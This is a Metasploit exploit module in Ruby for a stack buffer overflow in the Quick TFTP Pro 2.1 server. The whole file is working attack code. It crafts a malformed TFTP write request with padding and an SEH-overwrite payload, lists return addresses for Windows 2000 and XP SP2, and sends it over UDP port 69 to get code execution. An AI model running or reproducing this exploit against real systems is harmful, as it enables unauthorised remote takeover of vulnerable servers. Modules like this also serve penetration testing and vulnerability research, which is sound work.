require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

        include Msf::Exploit::Remote::Udp
        include Msf::Exploit::Remote::Seh

        def initialize(info = {})
	                super(update_info(info,
	                        'Name'           => 'Quick FTP Pro 2.1 Transfer-Mode Overflow',
	                        'Description'    => %q{
	                                This module exploits a stack overflow in the Quick TFTP Pro server
	                                product. MS Update KB926436 screws up the opcode address being used in oledlg.dll resulting
	                                in a DoS.  This is a port of a sploit by Mati "muts" Aharoni.
	                        },
	                        'Author'         => 'Saint Patrick',
	                        'Version'        => '$Revision: 2 $',
	                        'References'     =>
	                                [
	                                        ['BID', '28459'],
	                                        ['URL', 'http://secunia.com/advisories/29494'],
	                                ],
	                        'DefaultOptions' =>
	                                {
	                                        'EXITFUNC' => 'process',
	                                },
	                        'Payload'        =>
	                                {
	                                        'Space'    => 460,
	                                        'BadChars' => "\x00\x20\x0a\x0d",
	                                        'StackAdjustment' => -3500,
	                                },
	                               
	                        'Platform'       => 'win',
	                       
	                        'Targets'        =>
	                                [               
	                                        ['Windows Server 2000', { 'Ret' => 0x75022AC4} ], #ws2help.dll
	                                        ['Windows XP SP2', {'Ret' => 0x74D31458} ],       #oledlg.dll
	                                ],
	
	                        'DefaultTarget'  => 1,
	
	                        'DisclosureDate' => 'March 27 2008'))
	
	                        register_options(
	                        [
	                                Opt::RPORT(69)
	                        ], self.class)
	
	        end
	
	        def exploit
	                connect_udp
	
	                print_status("Trying target #{target.name}...")
	
	                sploit  = "\x00\x02" + rand_text_english(4, payload_badchars) + "\x00"
	                sploit += "A"*1019
	                seh  = generate_seh_payload(target.ret)
	                sploit +=seh
	                sploit += "\x00"
	
	                udp_sock.put(sploit)
	                print_status("Done.")
	
	                handler
	                disconnect_udp
	        end
	
	end